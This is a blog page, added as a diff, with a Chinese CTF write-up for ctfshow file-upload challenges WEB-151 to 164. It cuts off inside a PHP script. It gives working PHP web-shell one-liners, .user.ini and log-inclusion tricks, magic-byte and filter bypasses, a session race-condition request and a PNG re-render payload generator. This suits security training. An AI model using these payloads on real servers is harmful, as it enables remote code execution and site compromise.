@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-trophy-1.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-trophy-1.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css" integrity="sha256-Z1K5uhUaJXA7Ll0XrZ/0JhX4lAtZFpT6jkKrEDT0drU=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.14.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"show_result":true,"style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="ctfshow-文件上传">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow-文件上传">
+<meta property="og:url" content="http://example.com/post/c5a854c1.html">
+<meta property="og:site_name" content="Z1d10tのBlog">
+<meta property="og:description" content="ctfshow-文件上传">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688359146297-fb9749ff-2ad8-4a8d-b933-10f21f0d0931.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688365737442-53a194dd-aeea-4986-ba00-86ec08a101d4.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688444635540-b95e7f67-b6d6-4d61-9ecd-040a9d0124a4.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688451112419-1980ecb8-25aa-44d8-b6fe-14b539de29fc.png">
+<meta property="article:published_time" content="2023-07-04T08:32:29.000Z">
+<meta property="article:modified_time" content="2023-07-04T08:33:23.891Z">
+<meta property="article:author" content="Z1d10t">
+<meta property="article:tag" content="文件上传">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688359146297-fb9749ff-2ad8-4a8d-b933-10f21f0d0931.png">
+
+
+<link rel="canonical" href="http://example.com/post/c5a854c1.html">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/post/c5a854c1.html","path":"post/c5a854c1.html","title":"ctfshow-文件上传"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>ctfshow-文件上传 | Z1d10tのBlog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Z1d10tのBlog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description"> </p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-house fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tag fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-rectangle-list fa-fw"></i>分类</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>博主</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB-151-%E5%89%8D%E7%AB%AF%E9%AA%8C%E8%AF%81"><span class="nav-number">1.</span> <span class="nav-text">WEB-151(前端验证)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB-152-%E5%90%8E%E7%AB%AFContent-Type%E6%A0%A1%E9%AA%8C"><span class="nav-number">2.</span> <span class="nav-text">WEB-152(后端Content-Type校验)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB-153%EF%BC%88-user-ini%EF%BC%89"><span class="nav-number">3.</span> <span class="nav-text">WEB-153（.user.ini）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB-154-155%EF%BC%88-user-ini-%E7%9F%AD%E6%A0%87%E7%AD%BE%EF%BC%89"><span class="nav-number">4.</span> <span class="nav-text">WEB-154~155（.user.ini+短标签）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB-156-%E7%BB%95%E8%BF%87"><span class="nav-number">5.</span> <span class="nav-text">WEB-156([]绕过)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB-157-159-%E7%BB%95%E8%BF%87"><span class="nav-number">6.</span> <span class="nav-text">WEB-157~159({} ; ()绕过)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB-160-%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB-%E7%BB%95log"><span class="nav-number">7.</span> <span class="nav-text">WEB-160(日志包含 绕log)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB-161-%E6%96%87%E4%BB%B6%E5%A4%B4%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87"><span class="nav-number">8.</span> <span class="nav-text">WEB-161(文件头检测绕过)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB-162-163-session-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="nav-number">9.</span> <span class="nav-text">WEB-162~163(session 条件竞争)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB-164%EF%BC%88PNG-%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%EF%BC%89"><span class="nav-number">10.</span> <span class="nav-text">WEB-164（PNG 二次渲染）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB-165-jpg%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93"><span class="nav-number">11.</span> <span class="nav-text">WEB-165(jpg二次渲染)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB-166-zip"><span class="nav-number">12.</span> <span class="nav-text">WEB-166(zip)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB-167-htaccess"><span class="nav-number">13.</span> <span class="nav-text">WEB-167(.htaccess)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB-168-%E5%85%8D%E6%9D%80"><span class="nav-number">14.</span> <span class="nav-text">WEB-168(免杀)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB-169-WEB-170-%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB"><span class="nav-number">15.</span> <span class="nav-text">WEB-169~WEB-170(日志包含)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BB%93%E5%B0%BE%EF%BC%9A"><span class="nav-number">16.</span> <span class="nav-text">结尾：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">17.</span> <span class="nav-text"></span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Z1d10t"
+      src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/avatar.png">
+  <p class="site-author-name" itemprop="name">Z1d10t</p>
+  <div class="site-description" itemprop="description">Keep Hacking</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">61</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">83</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/post/c5a854c1.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/avatar.png">
+      <meta itemprop="name" content="Z1d10t">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Z1d10tのBlog">
+      <meta itemprop="description" content="Keep Hacking">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="ctfshow-文件上传 | Z1d10tのBlog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ctfshow-文件上传
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2023-07-04 16:32:29 / 修改时间：16:33:23" itemprop="dateCreated datePublished" datetime="2023-07-04T16:32:29+08:00">2023-07-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctfshow/" itemprop="url" rel="index"><span itemprop="name">-ctfshow</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>ctfshow-文件上传</p>
+<span id="more"></span>
+
+<h1 id="WEB-151-前端验证"><a href="#WEB-151-前端验证" class="headerlink" title="WEB-151(前端验证)"></a>WEB-151(前端验证)</h1><p>上传png后缀的 然后抓包改回php即可</p>
+<h1 id="WEB-152-后端Content-Type校验"><a href="#WEB-152-后端Content-Type校验" class="headerlink" title="WEB-152(后端Content-Type校验)"></a>WEB-152(后端Content-Type校验)</h1><p> Content-Type是返回消息中非常重要的内容，表示后面的文档属于什么MIME类型。  </p>
+<p>所以跟151做法一样 先上传png然后bp改后缀即可</p>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types</a></p>
+<p><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000013056786">https://segmentfault.com/a/1190000013056786</a></p>
+<h1 id="WEB-153（-user-ini）"><a href="#WEB-153（-user-ini）" class="headerlink" title="WEB-153（.user.ini）"></a>WEB-153（.user.ini）</h1><p>前两种通过修改后缀这里不能用了</p>
+<p>访问/upload 发现有内容nothing here 然后可以猜到这里有/uplaod/index.php </p>
+<p>那么目标就很明确了 我们上传的路径下有一个现成的php文件 理所当然想到通过上传.user.ini来做这道题</p>
+<p>但是.htaccess只是适用于apache，如果变成niginx或者iis则不会被解析      </p>
+<p>通过报错我们可以看到题目环境中间件是nginx 但是这也不影响我们用.user.ini</p>
+<p>因为只要用了fastcgi我们就可以用.user.ini</p>
+<p>FastCGI常用于将Web服务器（如Nginx、Apache）与应用程序（如PHP、Python、Ruby）进行集成，以提供动态内容的生成和处理能力。它是一种高性能、灵活和可扩展的Web应用程序交互协议。  </p>
+<p>.user.ini:</p>
+<p>.user.ini也是php的一种配置文件，众所周知php.ini是php的配置文件，它可以做到显示报错，导入扩展，文件解析，web站点路径等等设置。但是如果想要把某个文件里面的配置与全局的php.ini不同，则可以在php文件中加上ini_set()来配置特定的配置变量。</p>
+<p>而.user.ini和.htaccess一样是对当前目录的所以php文件的配置设置，即写了.user.ini和它同目录的文件会优先使用.user.ini中设置的配置属性。</p>
+<p>偷的<a target="_blank" rel="noopener" href="https://www.cnblogs.com/sijidou/p/13121301.html">https://www.cnblogs.com/sijidou/p/13121301.html</a></p>
+<p>简单理解就是php的配置文件它可以设置一些配置 比如怎么去解析我们上传的文件一类的</p>
+<p>内容:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//.user.ini</span></span><br><span class="line"></span><br><span class="line">auto_prepend_file=top.html</span><br><span class="line">auto_append_file=down.html</span><br></pre></td></tr></table></figure>
+
+<p>怎么理解？</p>
+<p>就是把我们指定的文件包含进宿主php文件中 利用其实本质就是用require()去包含我们的恶意文件并且即使后缀不是php文件也可被当作php文件来解析</p>
+<p>这里require()完全就是include()函数一样</p>
+<p>一个是宿主php文件头部去包含 一个是尾部两者皆可</p>
+<p>先将.user.ini增加后缀png然后抓包去除 在上传我们指定的恶意文件</p>
+<p>这时我们前面已经说的很清楚了 直接访问/upload/index.php 这样我们的木马就被包含在这个index.php文件中了而不是直接去访问我们的木马文件</p>
+<p>可以看到 已经包含在头部了</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688359146297-fb9749ff-2ad8-4a8d-b933-10f21f0d0931.png" alt="img"></p>
+<h1 id="WEB-154-155（-user-ini-短标签）"><a href="#WEB-154-155（-user-ini-短标签）" class="headerlink" title="WEB-154~155（.user.ini+短标签）"></a>WEB-154~155（.user.ini+短标签）</h1><p>waf了文件内容php字样</p>
+<p>用短标签bypass即可 </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[x]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="WEB-156-绕过"><a href="#WEB-156-绕过" class="headerlink" title="WEB-156([]绕过)"></a>WEB-156([]绕过)</h1><p>在154~155基础上过滤了<code>[]</code>用<code>&#123;&#125;</code>bypass</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=@eval($_POST&#123;x&#125;);?&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="WEB-157-159-绕过"><a href="#WEB-157-159-绕过" class="headerlink" title="WEB-157~159({} ; ()绕过)"></a>WEB-157~159({} ; ()绕过)</h1><p>在前面基础上过滤了{}和分号 那我们不写一句话了 直接命令执行读flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=`tac ./../f*`;?&gt;` 或者`&lt;?=system(&#x27;tac ../f*&#x27;)?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>159不行 过滤了括号只能用第一种 </p>
+<h1 id="WEB-160-日志包含-绕log"><a href="#WEB-160-日志包含-绕log" class="headerlink" title="WEB-160(日志包含 绕log)"></a>WEB-160(日志包含 绕log)</h1><p><code>&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;</code>log用拼接绕过</p>
+<p>然后文件头User-Agent包含一句话木马即可</p>
+<h1 id="WEB-161-文件头检测绕过"><a href="#WEB-161-文件头检测绕过" class="headerlink" title="WEB-161(文件头检测绕过)"></a>WEB-161(文件头检测绕过)</h1><p>在160基础上增加了检测文件头的函数 增加图片头GIF89a绕过即可</p>
+<p>getimagesize(): 会对目标文件的16进制去进行一个读取，去读取头几个字符串是不是符合图片的要求</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688365737442-53a194dd-aeea-4986-ba00-86ec08a101d4.png" alt="img"></p>
+<p>其实GIF89a就是我们一般见到的gif动图的文件头</p>
+<p>通过010对一个gif图分析就能看到文件头</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688444635540-b95e7f67-b6d6-4d61-9ecd-040a9d0124a4.png" alt="img"></p>
+<h1 id="WEB-162-163-session-条件竞争"><a href="#WEB-162-163-session-条件竞争" class="headerlink" title="WEB-162~163(session 条件竞争)"></a>WEB-162~163(session 条件竞争)</h1><p>之前别的模块做过类似的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;http://953ea87b-dff4-45be-adac-15a38b1fd7e3.challenge.ctf.show/&quot;</span> method=<span class="string">&quot;POST&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> value=<span class="string">&quot;123&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;submit&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>上传一个文件改数据包：</p>
+<p>加上木马和<code>Cookie:PHPSESSID=ban</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">953</span>ea87b-dff4-<span class="number">45</span>be-adac-<span class="number">15</span>a38b1fd7e3.challenge.ctf.show</span><br><span class="line">Content-Length: <span class="number">352</span></span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Origin: <span class="literal">null</span></span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarybDQ9C8w3UWP0rUGY</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">114.0</span>.<span class="number">0.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class="line"><span class="comment">Cookie:PHPSESSID=ban</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">------WebKitFormBoundarybDQ9C8w3UWP0rUGY</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;?php system(&#x27;cat ../f*&#x27;);?&gt;</span></span><br><span class="line"><span class="comment">------WebKitFormBoundarybDQ9C8w3UWP0rUGY</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.png&quot;</span></span><br><span class="line"><span class="comment">Content-Type: image/png</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">GIF89a</span></span><br><span class="line"><span class="comment">&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">------WebKitFormBoundarybDQ9C8w3UWP0rUGY--</span></span><br></pre></td></tr></table></figure>
+
+<p>然后再将.user.ini改为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=/tmp/sess_ban</span><br></pre></td></tr></table></figure>
+
+<p>然后两个条件竞争一直发包即可</p>
+<h1 id="WEB-164（PNG-二次渲染）"><a href="#WEB-164（PNG-二次渲染）" class="headerlink" title="WEB-164（PNG 二次渲染）"></a>WEB-164（PNG 二次渲染）</h1><p>随便上传一个图片 然后我们可以访问<code>http://6a0dd0db-7621-467f-8c76-dd8bd63732b6.challenge.ctf.show/download.php?image=32d3ca5e23f4ccf1e4c8660c40e75f33.png</code> 可以看到是通过文件包含形式</p>
+<p>二次渲染就是我们夹杂在图像里的木马上传后会被删掉 我们需要下载下来找到它不删除的地方把我们的木马加进去然后利用文件包含执行我们的木马</p>
+<p>因为我的php是8.2.0的版本 修改ini文件 <code>extension=gd</code>把前面的<code>;</code>去掉</p>
+<p>然后才能用这个脚本</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">            <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">            <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">            <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">            <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">            <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">            <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">            <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">    <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">    <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">    <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">    <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;1.png&#x27;</span>);  <span class="comment">//要修改的图片的路径 </span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 木马内容</span></span><br><span class="line"><span class="comment">&lt;?$_GET[0]($_POST[1]);?&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//imagepng($img,&#x27;1.png&#x27;);  要修改的图片的路径,1.png是使用的文件，可以不存在</span></span><br><span class="line"><span class="comment">//会在目录下自动创建一个1.png图片</span></span><br><span 